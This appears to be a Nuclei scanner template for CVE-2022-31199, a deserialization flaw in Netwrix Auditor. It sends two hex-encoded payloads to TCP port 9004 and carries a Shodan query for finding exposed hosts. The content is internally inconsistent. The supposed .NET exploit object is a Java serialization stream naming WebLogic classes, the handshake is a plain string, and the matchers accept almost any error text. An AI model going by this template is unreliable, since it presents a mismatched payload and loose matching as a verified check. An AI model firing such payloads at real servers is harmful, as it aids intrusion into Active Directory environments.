id: netwrix-auditor-uavr-rce

info:
  name: Netwrix Auditor - User Activity Video Recording RCE
  author: pdteam
  severity: critical
  description: |
    Netwrix Auditor User Activity Video Recording component contains a remote code execution
    vulnerability in the underlying .NET remoting protocol. An unauthenticated attacker can
    send a malicious serialized object to the UAVRServer endpoint on TCP port 9004, leading
    to arbitrary code execution with NT AUTHORITY\SYSTEM privileges. The vulnerability exists
    due to insecure deserialization of untrusted data in the .NET remoting service.
  impact: |
    Successful exploitation of this vulnerability allows unauthenticated remote attackers to
    execute arbitrary code with SYSTEM privileges on the affected Netwrix Auditor server.
    Since Netwrix Auditor typically runs with extensive privileges in Active Directory
    environments, this could lead to complete compromise of the Active Directory domain.
  remediation: |
    Upgrade Netwrix Auditor to version 10.5 or later. Additionally, restrict network access
    to TCP port 9004 using firewall rules to limit exposure to trusted networks only.
  reference:
    - https://bishopfox.com/blog/netwrix-auditor-advisory
    - https://nvd.nist.gov/vuln/detail/CVE-2022-31199
    - https://cisa.gov/known-exploited-vulnerabilities-catalog
    - https://www.netwrix.com/auditor.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-31199
    cwe-id: CWE-502
    epss-score: 0.97
    epss-percentile: 0.99
    cpe: cpe:2.3:a:netwrix:auditor:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: netwrix
    product: auditor
    shodan-query: 'port:9004'
    fofa-query: 'port=9004'
  tags: cve,cve2022,netwrix,auditor,rce,deserialization,dotnet,tcp,kev,vkev,critical,vuln

tcp:
  - host:
      - "{{Hostname}}"
    port: 9004

    inputs:
      # Phase 1: Send .NET remoting protocol handshake
      - data: "{{hex_decode('4e45542e52656d6f74696e672e4d657373616765733a3a4d657373616765547970652e4d6574686f64526573706f6e736500')}}"
        read: 1024

      # Phase 2: Send malicious serialized object to trigger deserialization vulnerability
      - data: "{{hex_decode('aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078')}}"
        read: 1024

    read-size: 1024

    matchers-condition: and
    matchers:
      # Matcher 1: Verify .NET Remoting service response
      - type: word
        part: raw
        words:
          - ".NET Remoting"
          - "MS .NET Remoting"
          - "remoting"
        condition: or

      # Matcher 2: Detect deserialization exception or error response
      - type: regex
        part: raw
        regex:
          - "(?i)(exception|error|failed|invalid|cannot|type mismatch|serialization)"

    extractors:
      - type: regex
        part: raw
        regex:
          - '(?i)(\.net|remoting|exception|error).*?([a-zA-Z0-9\.\s]+)'
        name: service_info
